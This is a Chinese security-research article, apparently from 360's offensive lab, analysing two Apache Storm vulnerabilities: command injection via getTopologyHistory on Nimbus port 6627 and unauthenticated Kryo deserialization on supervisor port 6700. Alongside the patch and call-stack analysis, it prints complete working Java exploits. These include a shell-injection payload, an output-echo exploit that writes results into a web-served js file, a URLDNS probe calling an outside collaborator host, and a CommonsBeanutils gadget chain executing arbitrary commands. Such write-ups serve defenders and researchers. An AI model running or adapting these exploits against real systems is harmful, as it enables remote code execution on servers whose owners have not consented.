**作者：0x28@360高级攻防实验室  
原文链接：<http://noahblog.360.cn/apache-storm-vulnerability-analysis/>**

## 0x00 前言

前段时间Apache Storm更了两个CVE，简短分析如下，本篇文章将对该两篇文章做补充。  
[GHSL-2021-086: Unsafe Deserialization in Apache Storm supervisor -CVE-2021-40865
](https://securitylab.github.com/advisories/GHSL-2021-086-apache-storm/)  
[GHSL-2021-085: Command injection in Apache Storm Nimbus - CVE-2021-38294
](https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/)

## 0x01 漏洞分析

CVE-2021-38294 影响版本为：1.x~1.2.3,2.0.0~2.2.0  
CVE-2021-40865 影响版本为：1.x~1.2.3,2.1.0,2.2.0

### CVE-2021-38294

#### 1、补丁相关细节

针对CVE-2021-38294命令注入漏洞，官方推出了补丁代码[https://github.com/apache/storm/compare/v2.2.0...v2.2.1#diff-30ba43eb15432ba1704c2ed522d03d588a78560fb1830b831683d066c5d11425](https://github.com/apache/storm/compare/v2.2.0...v2.2.1#diff-30ba43eb15432ba1704c2ed522d03d588a78560fb1830b831683d066c5d11425）)
将原本代码中的bash -c
和user拼接命令行执行命令的方式去掉，改为直接传入到数组中，即使user为拼接的命令也不会执行成功，带入的user变量中会直接成为id命令的参数。说明在ShellUtils类中调用，传入的user参数为可控

![img](https://images.seebug.org/content/images/2021/12/08/1638946042000-1dhvyz.png-w331s)

因此若传入的user参数为";whomai;"，则其中getGroupsForUserCommand拼接完得到的String数组为

    
    
    new String[]{"bash","-c","id -gn ; whoami;&& id -Gn; whoami;"}

而execCommand方法为可执行命令的方法，其底层的实现是调用ProcessBuilder实现执行系统命令，因此传入该String数组后，调用bash执行shell命令。其中shell命令用户可控，从而导致可执行恶意命令。

#### 2、execCommand命令执行细节

接着上一小节往下捋一捋命令执行函数的细节，ShellCommandRunnerImpl.execCommand()的实现如下

![img](https://images.seebug.org/content/images/2021/12/08/1638946044000-2snxlt.png-w331s)

execute()往后的调用链为execute()->ShellUtils.run()->ShellUtils.runCommand()

![img](https://images.seebug.org/content/images/2021/12/08/1638946044000-3hpygk.png-w331s)

![img](https://images.seebug.org/content/images/2021/12/08/1638946045000-4xawsn.png-w331s)

最终传入shell命令，调用ProcessBuilder执行命令。

![img](https://images.seebug.org/content/images/2021/12/08/1638946045000-5gehyn.png-w331s)

#### 3、调用栈执行流程细节

POC中作者给出了调试时的请求栈。

    
    
    getGroupsForUserCommand:124, ShellUtils (org.apache.storm.utils)getUnixGroups:110, ShellBasedGroupsMapping (org.apache.storm.security.auth)getGroups:77, ShellBasedGroupsMapping (org.apache.storm.security.auth)userGroups:2832, Nimbus (org.apache.storm.daemon.nimbus)isUserPartOf:2845, Nimbus (org.apache.storm.daemon.nimbus)getTopologyHistory:4607, Nimbus (org.apache.storm.daemon.nimbus)getResult:4701, Nimbus$Processor$getTopologyHistory (org.apache.storm.generated)getResult:4680, Nimbus$Processor$getTopologyHistory (org.apache.storm.generated)process:38, ProcessFunction (org.apache.storm.thrift)process:38, TBaseProcessor (org.apache.storm.thrift)process:172, SimpleTransportPlugin$SimpleWrapProcessor (org.apache.storm.security.auth)invoke:524, AbstractNonblockingServer$FrameBuffer (org.apache.storm.thrift.server)run:18, Invocation (org.apache.storm.thrift.server)runWorker:-1, ThreadPoolExecutor (java.util.concurrent)run:-1, ThreadPoolExecutor$Worker (java.util.concurrent)run:-1, Thread (java.lang)

根据以上在调用栈分析时，从最终的命令执行的漏洞代码所在处getGroupsForUserCommand仅仅只能跟踪到nimbus.getTopologyHistory()方法，似乎有点难以判断道作者在做该漏洞挖掘时如何确定该接口对应的是哪个服务和端口。也许作者可能是翻阅了大量的文档资料和测试用例从而确定了该接口，是如何从某个端口进行远程调用。

全文搜索6627端口，找到了6627在某个类中，被设置为默认值。以及结合在细读了Nimbus.java的代码后，关于以上疑惑我的大致分析如下。

Nimbus服务的启动时的步骤我人为地将其分为两个步骤，第一个是读取相应的配置得到端口，第二个是根据配置文件开启对应的端口和绑定相应的Service。

首先是启动过程，前期启动过程在/bin/storm和storm.py中加载Nimbus类。在Nimbus类中，main()->launch()->launchServer()后，launchServer中先实例化一个Nimbus对象，在New
Nimbus时加载Nimbus构造方法，在这个构造方法执行过程中，加载端口配置。接着实例化一个ThriftServer将其与nimbus对象绑定，然后初始化后，调用serve()方法接收传过来的数据。

![img](https://images.seebug.org/content/images/2021/12/08/1638946045000-6ixgqm.png-w331s)

Nimbus函数中通过this调用多个重载构造方法

![img](https://images.seebug.org/content/images/2021/12/08/1638946046000-7tfcrb.png-w331s)

在最后一个构造方法中发现其调用fromConf加载配置，并赋值给nimbusHostPortInfo

![img](https://images.seebug.org/content/images/2021/12/08/1638946046000-8gmmqc.png-w331s)

fromConf方法具体实现细节如下，这里直接设置port默认值为6627端口

![img](https://images.seebug.org/content/images/2021/12/08/1638946047000-9dwyst.png-w331s)

然后回到主流程线上，server.serve()开始接收请求

![img](https://images.seebug.org/content/images/2021/12/08/1638946048000-10msilj.png-w331s)

至此已经差不多理清了6627端口对应的服务的情况，也就是说，因为6627端口绑定了Nimbus对象，所以可以通过对6627端口进行远程调用getTopologyHistory方法。

![img](https://images.seebug.org/content/images/2021/12/08/1638946048000-11nneac.png-w331s)

#### 4、关于如何构造POC

根据以上漏洞分析不难得出只需要连接6627端口，并发送相应字符串即可。已经确定了6627端口服务存在的漏洞，可以通过源代码中的的测试用例进行快速测试，避免了需要大量翻阅文档构造poc的过程。官方poc如下

    
    
    import org.apache.storm.utils.NimbusClient;
    import java.util.ArrayList;
    import java.util.HashMap;
    import java.util.List;
    
    public class ThriftClient {
        public static void main(String[] args) throws Exception {
            HashMap config = new HashMap();
            List<String> seeds = new ArrayList<String>();
            seeds.add("localhost");
            config.put("storm.thrift.transport", "org.apache.storm.security.auth.SimpleTransportPlugin");
            config.put("storm.thrift.socket.timeout.ms", 60000);
            config.put("nimbus.seeds", seeds);
            config.put("storm.nimbus.retry.times", 5);
            config.put("storm.nimbus.retry.interval.millis", 2000);
            config.put("storm.nimbus.retry.intervalceiling.millis", 60000);
            config.put("nimbus.thrift.port", 6627);
            config.put("nimbus.thrift.max_buffer_size", 1048576);
            config.put("nimbus.thrift.threads", 64);
            NimbusClient nimbusClient = new NimbusClient(config, "localhost", 6627);
    
            // send attack
            nimbusClient.getClient().getTopologyHistory("foo;touch /tmp/pwned;id ");
        }
    }

在测试类org/apache/storm/nimbus/NimbusHeartbeatsPressureTest.java中，有以下代码针对6627端口的测试

![img](https://images.seebug.org/content/images/2021/12/08/1638946048000-12tqmws.png-w331s)

可以看到实例化过程需要传入配置参数，远程地址和端口。配置参数如下,构造一个config即可。

![img](https://images.seebug.org/content/images/2021/12/08/1638946048000-13ymtml.png-w331s)

并且通过getClient().xxx()对相应的方法进行调用，如下图中调用sendSupervisorWorkerHeartbeats

![img](https://images.seebug.org/content/images/2021/12/08/1638946049000-14wyllh.png-w331s)

且与getTopologyHistory一样，该方法同样为Nimbus类的成员方法，因此可以使用同样的手法对getTopologyHistory进行远程调用

![img](https://images.seebug.org/content/images/2021/12/08/1638946049000-15ixgov.png-w331s)

### CVE-2021-40865

#### 1、补丁相关细节

针对CVE-2021-40865，官方推出的补丁代码，对传过来的数据在反序列化之前若默认配置不开启验证则增加验证(<https://github.com/apache/storm/compare/v2.2.0...v2.2.1#diff-463899a7e386ae4ae789fb82786aff023885cd289c96af34f4d02df490f92aa2>),
即默认开启验证。

![img](https://images.seebug.org/content/images/2021/12/08/1638946049000-16zyalg.png-w331s)

通过查阅资料可知ChannelActive方法为连接时触发验证

![img](https://images.seebug.org/content/images/2021/12/08/1638946050000-17xmdvc.png-w331s)

可以看到在旧版本的代码上的channelActive方法没有做登录时的登录验证。且从补丁信息上也可以看出来这是一个反序列化漏洞的补丁。该反序列化功能存在于StormClientPipelineFactory.java中，由于没做登录验证，导致可以利用该反序列化漏洞调用gadget执行系统命令。

![img](https://images.seebug.org/content/images/2021/12/08/1638946050000-18tdtor.png-w331s)

#### 2、反序列化漏洞细节

在StormClientPipelineFactory.java中数据流进来到最终进行处理需要经过解码器，而解码器则调用的是MessageCoder和KryoValuesDeserializer进行处理，KryoValuesDeserializer需要先进行初步生成反序列化器，最后通过MessageDecoder进行解码

![img](https://images.seebug.org/content/images/2021/12/08/1638946050000-19glimo.png-w331s)

最终在数据流解码时触发进入MessageDecoder.decode()，在decode逻辑中，作者也很精妙地构造了fake数据完美走到反序列化最终流程点。首先是读取两个字节的short型数据到code变量中

![img](https://images.seebug.org/content/images/2021/12/08/1638946051000-20apotl.png-w331s)

判断该code是否为-600，若为-600则取出四个字节作为后续字节的长度，接着去除后续的字节数据传入到BackPressureStatus.read()中

![img](https://images.seebug.org/content/images/2021/12/08/1638946051000-21hqxvv.png-w331s)

并在read方法中对传入的bytes进行反序列化

![img](https://images.seebug.org/content/images/2021/12/08/1638946051000-22duvid.png-w331s)

#### 3、调用栈执行流程细节

尝试跟着代码一直往上回溯一下，找到开启该服务的端口

    
    
    Server.java - new Server(topoConf, port, cb, newConnectionResponse);
    WorkerState.java - this.mqContext.bind(topologyId, port, cb, newConnectionResponse); 
    Worker.java - loadWorker(IStateStorage stateStorage, IStormClusterState stormClusterState,Map<String, String> initCreds, Credentials initialCredentials)
    LocalContainerLauncher.java - launchContainer(int port, LocalAssignment assignment, LocalState state)
    Slot.java - run()
    ReadClusterState.java - ReadClusterState()
    Supervisor.java - launch()
    Supervisor.java - launchDaemon()

而在Supervisor.java中先实例化Supervisor，在实例化的同时加载配置文件（配置文件storm.yaml配置6700端口），然后调用launchDaemon进行服务加载

![img](https://images.seebug.org/content/images/2021/12/08/1638946052000-23xxysm.png-w331s)

读取配置文件细节为会先调用ConfigUtils.readStormConfig()读取对应的配置文件

![img](https://images.seebug.org/content/images/2021/12/08/1638946052000-24raqvi.png-w331s)

ConfigUtils.readStormConfig() -> ConfigUtils.readStormConfigImpl() ->
Utils.readFromConfig()

![img](https://images.seebug.org/content/images/2021/12/08/1638946052000-25cjnyk.png-w331s)

可以看到调用findAndReadConfigFile读取storm.yaml

![img](https://images.seebug.org/content/images/2021/12/08/1638946052000-26ukuxc.png-w331s)

读取完配置文件后进入launchDaemon，调用launch方法

![img](https://images.seebug.org/content/images/2021/12/08/1638946052000-27gcovc.png-w331s)

在launch中实例化ReadClusterState

![img](https://images.seebug.org/content/images/2021/12/08/1638946052000-28jexea.png-w331s)

在ReadClusterState的构造方法中会依次调用slot.start()，进入Slot的run方法。最终调用LocalContainerLauncher.launchContainer()，并同时传入端口等配置信息，最终调用new
Server(topoConf, port, cb, newConnectionResponse)，监听对应的端口和绑定Handler。

#### 4、关于POC构造

    
    
    import org.apache.commons.io.IOUtils;
    import org.apache.storm.serialization.KryoValuesSerializer;
    import ysoserial.payloads.ObjectPayload;
    import ysoserial.payloads.URLDNS;
    
    import java.io.*;
    import java.math.BigInteger;
    import java.net.*;
    import java.util.HashMap;
    
    public class NettyExploit {
    
        /**
         * Encoded as -600 ... short(2) len ... int(4) payload ... byte[]     *
         */
        public static byte[] buffer(KryoValuesSerializer ser, Object obj) throws IOException {
            byte[] payload = ser.serializeObject(obj);
            BigInteger codeInt = BigInteger.valueOf(-600);
            byte[] code = codeInt.toByteArray();
            BigInteger lengthInt = BigInteger.valueOf(payload.length);
            byte[] length = lengthInt.toByteArray();
    
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream( );
            outputStream.write(code);
            outputStream.write(new byte[] {0, 0});
            outputStream.write(length);
            outputStream.write(payload);
            return outputStream.toByteArray( );
        }
    
        public static KryoValuesSerializer getSerializer() throws MalformedURLException {
            HashMap<String, Object> conf = new HashMap<>();
            conf.put("topology.kryo.factory", "org.apache.storm.serialization.DefaultKryoFactory");
            conf.put("topology.tuple.serializer", "org.apache.storm.serialization.types.ListDelegateSerializer");
            conf.put("topology.skip.missing.kryo.registrations", false);
            conf.put("topology.fall.back.on.java.serialization", true);
            return new KryoValuesSerializer(conf);
        }
    
        public static void main(String[] args) {
            try {
                // Payload construction
                String command = "http://k6r17p7xvz8a7wj638bqj6dydpji77.burpcollaborator.net";
                ObjectPayload gadget = URLDNS.class.newInstance();
                Object payload = gadget.getObject(command);
    
                // Kryo serialization
                byte[] bytes = buffer(getSerializer(), payload);
    
                // Send bytes
                Socket socket = new Socket("127.0.0.1", 6700);
                OutputStream outputStream = socket.getOutputStream();
                outputStream.write(bytes);
                outputStream.flush();
                outputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

其实这个反序列化POC构造跟其他最不同的点在于需要构造一些前置数据，让后面被反序列化的字节流走到反序列化方法中，因此需要先构造一个两个字节的-600数值，再构造一个四个字节的数值为序列化数据的长度数值，再加上自带序列化器进行构造的序列化数据，发送到服务端即可。

## 0x02 复现&回显Exp

### CVE-2021-38294

复现如下

![img](https://images.seebug.org/content/images/2021/12/08/1638946053000-29ggruc.png-w331s)

![img](https://images.seebug.org/content/images/2021/12/08/1638946053000-30jxwdk.png-w331s)

调试了一下EXP，由于是直接的命令执行，因此直接采用将执行结果写入一个不存在的js中（命令执行自动生成），访问web端js即可。

    
    
    import com.github.kevinsawicki.http.HttpRequest;
    import org.apache.storm.generated.AuthorizationException;
    import org.apache.storm.thrift.TException;
    import org.apache.storm.thrift.transport.TTransportException;
    import org.apache.storm.utils.NimbusClient;
    import java.util.ArrayList;
    import java.util.HashMap;
    import java.util.List;
    
    public class CVE_2021_38294_ECHO {
        public static void main(String[] args) throws Exception, AuthorizationException {
            String command = "ifconfig";
            HashMap config = new HashMap();
            List<String> seeds = new ArrayList<String>();
            seeds.add("localhost");
            config.put("storm.thrift.transport", "org.apache.storm.security.auth.SimpleTransportPlugin");
            config.put("storm.thrift.socket.timeout.ms", 60000);
            config.put("nimbus.seeds", seeds);
            config.put("storm.nimbus.retry.times", 5);
            config.put("storm.nimbus.retry.interval.millis", 2000);
            config.put("storm.nimbus.retry.intervalceiling.millis", 60000);
            config.put("nimbus.thrift.port", 6627);
            config.put("nimbus.thrift.max_buffer_size", 1048576);
            config.put("nimbus.thrift.threads", 64);
            NimbusClient nimbusClient = new NimbusClient(config, "localhost", 6627);
            nimbusClient.getClient().getTopologyHistory("foo;" + command + "> ../public/js/log.min.js; id");
            String response = HttpRequest.get("http://127.0.0.1:8082/js/log.min.js").body();
            System.out.println(response);
        }
    
    }

![img](https://images.seebug.org/content/images/2021/12/08/1638946054000-31qilxl.png-w331s)

### CVE-2021-40865

复现如下

![img](https://images.seebug.org/content/images/2021/12/08/1638946054000-32pdmos.png-w331s)

![img](https://images.seebug.org/content/images/2021/12/08/1638946054000-33xtoqm.png-w331s)

原本POC只有URLDNS的探测，在依赖中看到CommonsBeanutils-1.7.0版本，直接使用Ysoserial的payload也可以，但是为了缩小体积，这里直接使用Phithon师傅的Cb代码进行改造。改造后的代码如下

    
    
    import com.github.kevinsawicki.http.HttpRequest;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.CtMethod;
    import org.apache.commons.beanutils.BeanComparator;
    import org.apache.commons.io.IOUtils;
    import org.apache.storm.serialization.KryoValuesSerializer;
    
    
    import java.io.*;
    import java.lang.reflect.Field;
    import java.math.BigInteger;
    import java.net.*;
    import java.util.HashMap;
    import java.util.PriorityQueue;
    //import javassist.ClassPool;
    /**
     * Hello world!
     *
     */
    public class CVE_2021_40865_ECHO
    {
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
    
        public static byte[] buffer(KryoValuesSerializer ser, Object obj) throws IOException {
            byte[] payload = ser.serializeObject(obj);
            BigInteger codeInt = BigInteger.valueOf(-600);
            byte[] code = codeInt.toByteArray();
            BigInteger lengthInt = BigInteger.valueOf(payload.length);
            byte[] length = lengthInt.toByteArray();
    
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream( );
            outputStream.write(code);
            outputStream.write(new byte[] {0, 0});
            outputStream.write(length);
            outputStream.write(payload);
            return outputStream.toByteArray( );
        }
    
        public static KryoValuesSerializer getSerializer() throws MalformedURLException {
            HashMap<String, Object> conf = new HashMap<>();
            conf.put("topology.kryo.factory", "org.apache.storm.serialization.DefaultKryoFactory");
            conf.put("topology.tuple.serializer", "org.apache.storm.serialization.types.ListDelegateSerializer");
            conf.put("topology.skip.missing.kryo.registrations", false);
            conf.put("topology.fall.back.on.java.serialization", true);
            return new KryoValuesSerializer(conf);
        }
    
        public static void main(String[] args) {
            try {
                byte[] bytes = buffer(getSerializer(), getPayloadObject("ifconfig"));
                Socket socket = new Socket("127.0.0.1", 6700);
                OutputStream outputStream = socket.getOutputStream();
                outputStream.write(bytes);
                outputStream.flush();
                outputStream.close();
                String response = HttpRequest.get("http://127.0.0.1:8082/js/log.min.js").body();
                System.out.println(response);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        public static Object getPayloadObject(String command) throws Exception {
            TemplatesImpl obj = new TemplatesImpl();
            ClassPool classPool = ClassPool.getDefault();
            CtClass cc = classPool.get(EvilTemplatesImpl.class.getName());
            CtMethod ctMethod = cc.getDeclaredMethod("getCmd");
            ctMethod.setBody("return \""+ command + "  > /tmp/storm.log\";");
            setFieldValue(obj, "_bytecodes", new byte[][]{
                    cc.toBytecode()
            });
            setFieldValue(obj, "_name", "HelloTemplatesImpl");
            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
    
            final BeanComparator comparator = new BeanComparator();
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            // stub data for replacement later
            queue.add(1);
            queue.add(1);
    
            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{obj, obj});
    
            return queue;
        }
    }
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    public class EvilTemplatesImpl extends AbstractTranslet{
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
    
        public EvilTemplatesImpl() throws Exception {
            super();
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", getCmd()} : new String[]{"cmd.exe", "/c", getCmd() };
            Runtime.getRuntime().exec(cmds);
        }
    
        public String getCmd(){
            return "";
        }
    }

为了方便传参命令，这里使用javassist运行时修改类代码,利用命令执行后将结果输出到一个新的不存在的js文件中，再使用web请求访问该js即可。

![img](https://images.seebug.org/content/images/2021/12/08/1638946055000-34gutbw.png-w331s)

不过以上两个exp的路径都要依赖于程序启动路径，因此在写文件这一块可能会有坑。

## 0x03 写在最后

由于本次分析时调试环境一直起不来，因此直接静态代码分析，可能会有漏掉或者错误的地方，还请师傅们指出和见谅。

## 0x04 参考

<https://www.w3cschool.cn/apache_storm/apache_storm_installation.html>

<https://securitylab.github.com/advisories/GHSL-2021-086-apache-storm/>

<https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/>

<https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html>

<https://github.com/frohoff/ysoserial>

<https://www.w3cschool.cn/apache_storm/apache_storm_installation.html>

<https://m.imooc.com/wiki/nettylesson-netty02>

<https://xz.aliyun.com/t/7348>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1780/>

